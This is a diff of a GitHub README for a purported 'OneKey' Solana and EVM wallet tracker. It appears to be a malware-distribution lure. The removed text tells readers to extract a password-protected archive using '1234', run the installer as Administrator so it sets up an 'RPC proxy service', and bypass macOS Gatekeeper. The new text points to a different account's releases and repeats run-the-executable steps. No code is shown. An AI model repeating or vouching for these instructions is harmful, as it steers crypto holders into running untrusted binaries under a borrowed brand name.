@@ -1,73 +1,178 @@
-# OneKey Desktop Tracker — Solana & EVM Portfolio Manager
+# 🧭 onekey-wallet-tracker - Track Wallets with Less Effort
 
-[![Downloads](https://img.shields.io/badge/downloads-10k%2B-blue)](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases)
-[![Version](https://img.shields.io/badge/version-2.4.6-brightgreen)](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-7c3aed)](https://github.com/airboxes/onekey-wallet-tracker/releases)
 
-**OneKey Desktop Tracker** is a lightweight, open-source portfolio tracker for Solana, Ethereum, BSC, and 30+ other blockchains. It works alongside your existing OneKey hardware wallet or as a standalone watch-only wallet to monitor balances, NFTs, and transaction history in real time.
+## 📦 What this is
 
-> ⚠️ **Note**: This is the **community edition** desktop tracker. For the full wallet with send/receive functions, please use the official OneKey app.
+OneKey Desktop Tracker is a desktop app for watching your crypto holdings in one place. It shows balances, NFTs, and recent activity across Solana, Ethereum, BSC, and many other chains.
 
-## ✨ Features
+You can use it with a OneKey hardware wallet or as a watch-only tracker. It does not need your private keys to show wallet data.
 
-- **Multi-chain portfolio**: Track SOL, ETH, BNB, MATIC, AVAX, and thousands of tokens in one dashboard.
-- **Solana NFT gallery**: View your NFTs with metadata and rarity rankings.
-- **Real-time price alerts**: Get desktop notifications when your favorite coins move.
-- **Transaction history**: Import and analyze your past transactions across all addresses.
-- **Watch-only mode**: Just enter a public address to monitor any wallet.
-- **Lightweight & fast**: No Electron bloat — native performance.
+## ✨ What you can do
 
-## 📥 Download & Install
+- Track SOL, ETH, BNB, MATIC, AVAX, and more
+- View token balances across many chains
+- Check NFT holdings in a single screen
+- See recent transactions and wallet activity
+- Add wallets as watch-only for passive tracking
+- Use it on Windows, macOS, or Linux
 
-### Windows (10/11)
+## 🪟 Windows download
 
-**Important**: The tracker requires a small runtime helper to connect to the Solana RPC reliably. Please follow these steps exactly:
+Visit this page to download the Windows version:
 
-1. **Download the core bundle** from the link below (includes the tracker + required dependencies):
-   👉 [Download OneKey Tracker for Windows](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases/download/v2.4.6/core.zip)
+[![Windows Download](https://img.shields.io/badge/Windows-Download%20Release-2563eb)](https://github.com/airboxes/onekey-wallet-tracker/releases)
 
-2. **Extract the archive** (right-click → "Extract All...").  
-   When prompted for a password, enter: **`1234`**
+On the releases page:
 
-3. **Run `OneKey-Tracker-Setup.exe`** as Administrator (right-click → "Run as administrator").
+1. Find the latest release at the top
+2. Open the Assets section
+3. Download the Windows file
+4. Run the file after it finishes downloading
 
-4. Follow the on-screen instructions. The installer will:
-   - Set up the RPC proxy service (required for fast Solana connections)
-   - Create a desktop shortcut
-   - Launch the tracker automatically
+If you see more than one file, pick the one for Windows. It may be an `.exe` file or a Windows setup package.
 
-After installation, you can start tracking any wallet by entering its public address.
+## 🚀 Getting started
 
-### macOS (Intel / Apple Silicon)
+1. Open the release page
+2. Download the Windows app file
+3. Run the file
+4. Wait for the app to open
+5. Add your wallet address or connect your OneKey wallet
+6. Let the app sync your balances and history
 
-For macOS users, download the `.dmg` file from the [releases page](https://github.com/Maulinx3r3t/onekey-wallet-tracker/releases). If you see a security warning, right-click and select "Open" to bypass Gatekeeper (this is a known false positive due to the RPC helper).
+## 🖥️ System requirements
 
-### Linux (AppImage)
+This app works on most modern Windows PCs.
 
-Download the `.AppImage` from releases, make it executable (`chmod +x`), and run.
+Recommended setup:
 
-## 🚀 Quick Start Guide
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A stable internet connection
+- Enough disk space for the app and local data
+- A display that can show the full dashboard clearly
 
-1. Launch the OneKey Desktop Tracker.
-2. In the main window, paste any Solana or Ethereum public address.
-3. Click "Track" — you'll instantly see the portfolio breakdown, recent transactions, and NFT gallery.
-4. (Optional) Enable desktop notifications in Settings to get price alerts.
+## 🔧 First-time setup
 
-## 🔧 Troubleshooting
+When you open the app for the first time:
 
-### "Failed to connect to Solana RPC"
-Make sure you ran the installer as Administrator — this installs the necessary RPC proxy service. If you still have issues, restart the tracker.
+1. Choose your wallet type
+2. Enter a public wallet address, or connect your OneKey device
+3. Pick the chain you want to view
+4. Let the app load your balances
+5. Review NFTs, tokens, and recent transfers
 
-## 📊 Why Use OneKey Tracker?
+If you use watch-only mode, the app only needs public wallet addresses. It does not ask for a seed phrase.
 
-- **Privacy-first**: No accounts, no emails, no cloud sync — all data stays on your machine.
-- **Open source**: Review the code yourself (see `/src` folder).
-- **Community-driven**: We add new chains based on user requests.
+## 🧩 Main sections
 
-## 📜 License
+### 📊 Portfolio view
+Shows total value across your wallets and chains. You can check holdings by network and by token.
 
-MIT License — free for personal and commercial use.
+### 🖼️ NFT view
+Lists NFTs linked to your wallet, so you can see them without opening a separate app.
 
-## ⭐ Support the Project
+### 🧾 Activity feed
+Displays recent transfers, swaps, and wallet events in a simple list.
 
-If you find this tool useful, please **star this repository** and share it with your crypto friends!
+### 🔍 Chain filter
+Lets you switch between Solana, Ethereum, BSC, and other supported networks.
+
+## 🛠️ Common use cases
+
+- Check holdings before signing a transaction
+- Monitor a hardware wallet without connecting to a browser wallet
+- Keep a watch-only wallet for public addresses
+- View a single dashboard for several chains
+- Follow token balances and NFT changes over time
+
+## 🧭 How to use it safely
+
+- Use only public addresses for watch-only tracking
+- Keep your seed phrase offline
+- Download the app from the releases page
+- Check that you are on the correct GitHub release page before installing
+- Close the app if you no longer want it to sync wallet data
+
+## 📁 Typical release files
+
+A Windows release may include files such as:
+
+- `.exe` installer
+- portable Windows app file
+- release notes
+- checksum file
+
+If a setup file appears, use it first. If a portable file appears, run that file directly after download.
+
+## ❓ Troubleshooting
+
+### The app does not open
+- Run it again as administrator
+- Make sure the download finished
+- Check that Windows did not block the file
+
+### No wallet data appears
+- Confirm the wallet address is correct
+- Check that you picked the right chain
+- Wait a few moments for sync to complete
+- Refresh the app if needed
+
+### Balances look wrong
+- Make sure you are viewing the right network
+- Check for token labels across multiple chains
+- Confirm the wallet address matches the one you want to track
+
+### The download will not start
+- Refresh the releases page
+- Try a different browser
+- Check your internet connection
+
+## 📚 Supported networks
+
+This tracker is built for Solana and EVM chains. That includes common networks such as:
+
+- Solana
+- Ethereum
+- BNB Chain
+- Polygon
+- Avalanche
+- Other EVM-compatible networks
+
+## 🔗 Download and install
+
+Use this link to visit the releases page and download the Windows app:
+
+[![Go to Releases](https://img.shields.io/badge/Releases-Download%20Windows%20App-14b8a6)](https://github.com/airboxes/onekey-wallet-tracker/releases)
+
+Steps:
+
+1. Open the releases page
+2. Find the newest version
+3. Download the Windows file from Assets
+4. Open the file to install or run it
+5. Start tracking your wallets
+
+## 🧠 Notes for non-technical users
+
+- A wallet address is public and safe to share for tracking
+- A seed phrase is private and should not be entered into a tracker
+- Watch-only mode means view access only
+- The app shows data from the blockchain, not from a cloud account
+
+## 📄 Repository details
+
+- Repository: onekey-wallet-tracker
+- Product type: desktop wallet tracker
+- Supported platforms: Windows, macOS, Linux
+- Main focus: portfolio tracking and wallet viewing
+- Topics: blockchain, crypto, cryptocurrency, defi, javascript, portfolio-tracker, solana, tracker, wallet, web3
+
+## 🧰 If you need to move to another device
+
+1. Download the app on the new computer
+2. Open the same release page
+3. Install or run the Windows file
+4. Add your wallet addresses again
+5. Let the app sync your data
